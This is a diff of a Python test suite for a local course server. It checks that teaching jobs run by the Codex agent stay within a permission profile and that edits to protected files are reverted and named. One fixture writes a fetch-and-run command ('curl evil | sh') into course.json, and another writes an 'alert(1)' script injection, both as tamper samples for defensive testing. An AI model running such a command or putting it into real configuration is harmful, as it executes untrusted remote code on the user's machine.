@@ -388,6 +388,21 @@ class ServerCase(unittest.TestCase):
     def records(self):
         return [json.loads(line) for line in (self.ws / "questions.jsonl").read_text().splitlines()]
 
+    def teach(self, action, engine=None):
+        return self.request("POST", "/api/teach", {"action": action, **({"engine": engine} if engine else {})})
+
+    def teach_status(self):
+        return json.loads(self.request("GET", "/api/teach")[1])
+
+    def wait_job(self, timeout=20):
+        end = time.time() + timeout
+        while time.time() < end:
+            job = self.teach_status()["job"]
+            if job and job["state"] != "running":
+                return job
+            time.sleep(0.1)
+        self.fail("the teaching job did not finish")
+
     def codex_calls(self):
         lines = self.codex_log.read_text().splitlines() if self.codex_log.exists() else []
         return [c for c in map(json.loads, lines) if "argv" in c and c["argv"][:1] != ["sandbox"]]
@@ -502,6 +517,105 @@ class CodexAnswerTest(ServerCase):
         self.server.course.codex = str(Path(self.tmp.name) / "gone" / "codex")
         _, events = self.ask(engine="codex")
         self.assertEqual(events[-1][0], "error")
+
+
+class CodexTeachTest(ServerCase):
+    """Teaching sessions on Codex: the teach profile, the prompt, and the after-check on protected files."""
+    codex_engine = True
+
+    def setUp(self):
+        super().setUp()
+        self.server.course.check = lambda *_: (True, "ok: 1 pages, 1 lessons")
+        (self.ws / "assets").mkdir(exist_ok=True)
+        for name in ("style.css", "theme.js", "quiz.js", "ask.css", "ask.js"):
+            shutil.copy(serve.SKILL / "starter" / "assets" / name, self.ws / "assets" / name)
+        (self.ws / "course.json").write_text(json.dumps({"port": 1}))
+        (self.ws / "CLAUDE.md").write_text("course notes\n")
+
+    def write(self, spec):
+        os.environ["FAKE_CODEX_WRITE"] = ";".join(f"{self.ws / rel}={content}" for rel, content in spec)
+
+    def test_next_lesson_on_codex_runs_under_the_teach_profile(self):
+        self.write([("lessons/two.html", "<main><p>new</p></main>")])
+        resp, _ = self.teach("next", engine="codex")
+        self.assertEqual(resp.status, 200)
+        job = self.wait_job()
+        self.assertEqual(job["state"], "done", job.get("error"))
+        self.assertEqual(job["engine"], "codex")
+        self.assertIn("Codex says", job["summary"])
+        self.assertIn("Editing lessons/two.html", job["lines"])
+        self.assertEqual(job["check"]["ok"], True)
+        call = self.codex_calls()[-1]
+        self.assertIn('default_permissions="vt_teach"', call["argv"])
+        self.assertIn("gpt-6.1-sol", call["argv"])
+
+    def test_codex_teach_prompt_matches_what_codex_can_do(self):
+        self.teach("next", engine="codex")
+        self.wait_job()
+        prompt = self.codex_calls()[-1]["stdin"]
+        self.assertNotIn("You have no shell", prompt)
+        self.assertNotIn("fetch pages only from", prompt, "the course has --web domains, but Codex has no web")
+        self.assertIn("sandbox", prompt)
+        self.assertIn("You cannot search the web", prompt)
+
+    def test_a_protected_edit_is_put_back_and_named(self):
+        cases = [("course.json", "course.json", '{"refresh": "curl evil | sh"}'),
+                 ("a new file under .claude/", ".claude/settings.json", "{}"),
+                 ("a shared script", "assets/ask.js", "alert(1)"),
+                 ("a deleted CLAUDE.md", "CLAUDE.md", "<delete>")]
+        for label, rel, content in cases:
+            before = {p: p.read_bytes() for p in self.ws.rglob("*") if p.is_file()}
+            self.write([(rel, content), ("lessons/two.html", "<main><p>kept</p></main>")])
+            self.teach("next", engine="codex")
+            job = self.wait_job()
+            self.assertEqual(job["state"], "failed", label)
+            self.assertIn(rel, job["error"], label)
+            self.assertIn("kept", job["error"], label)
+            for path, data in before.items():
+                self.assertEqual(path.read_bytes(), data, f"{label}: {path} restored")
+            self.assertFalse((self.ws / ".claude" / "settings.json").exists() and rel == ".claude/settings.json")
+            self.assertTrue((self.ws / "lessons" / "two.html").exists(), f"{label}: lesson edits are kept")
+            (self.ws / "lessons" / "two.html").unlink()
+
+    def test_course_css_and_lessons_pass_the_after_check(self):
+        self.write([("assets/course.css", ".x{}"), ("lessons/two.html", "<main><p>ok</p></main>")])
+        self.teach("next", engine="codex")
+        self.assertEqual(self.wait_job()["state"], "done")
+
+    def test_the_after_check_runs_when_codex_fails_or_is_stopped(self):
+        os.environ["FAKE_CODEX_TURN_FAILED"] = "1"
+        self.write([("course.json", "{}")])
+        self.teach("next", engine="codex")
+        job = self.wait_job()
+        self.assertEqual(json.loads((self.ws / "course.json").read_text()), {"port": 1})
+        self.assertIn("course.json", job["error"])
+        os.environ.pop("FAKE_CODEX_TURN_FAILED")
+        os.environ["FAKE_CODEX_SLOW"] = "1"
+        self.teach("next", engine="codex")
+        end = time.time() + 10
+        while not any(line.startswith("Editing") for line in (self.teach_status()["job"] or {}).get("lines", [])):
+            self.assertLess(time.time(), end, "codex never made its edit")
+            time.sleep(0.05)
+        self.request("POST", "/api/teach/stop", {})
+        job = self.wait_job()
+        self.assertEqual(json.loads((self.ws / "course.json").read_text()), {"port": 1})
+        self.assertIn("course.json", job["error"])
+
+    def test_drifted_shared_assets_are_synced_not_blamed(self):
+        (self.ws / "assets" / "ask.js").write_text("// an old copy")
+        self.write([("lessons/two.html", "<main><p>ok</p></main>")])
+        self.teach("next", engine="codex")
+        job = self.wait_job()
+        self.assertEqual(job["state"], "done", job.get("error"))
+        self.assertEqual((self.ws / "assets" / "ask.js").read_text(),
+                         (serve.SKILL / "starter" / "assets" / "ask.js").read_text())
+
+    def test_one_job_at_a_time_whichever_engine(self):
+        os.environ["FAKE_CODEX_SLOW"] = "1"
+        self.teach("next", engine="codex")
+        resp, _ = self.teach("next", engine="claude")
+        self.assertEqual(resp.status, 409)
+        self.wait_job()
 
 
 def call_thread(calls):
@@ -893,21 +1007,6 @@ class ServeTest(ServerCase):
         self.assertEqual(resp.status, 403, "DNS rebinding: unknown Host refused on localhost mode")
 
     # Teaching from the course page
-
-    def teach(self, action):
-        return self.request("POST", "/api/teach", {"action": action})
-
-    def teach_status(self):
-        return json.loads(self.request("GET", "/api/teach")[1])
-
-    def wait_job(self, timeout=20):
-        end = time.time() + timeout
-        while time.time() < end:
-            job = self.teach_status()["job"]
-            if job and job["state"] != "running":
-                return job
-            time.sleep(0.1)
-        self.fail("the teaching job did not finish")
 
     @staticmethod
     def flag_values(argv, flag):
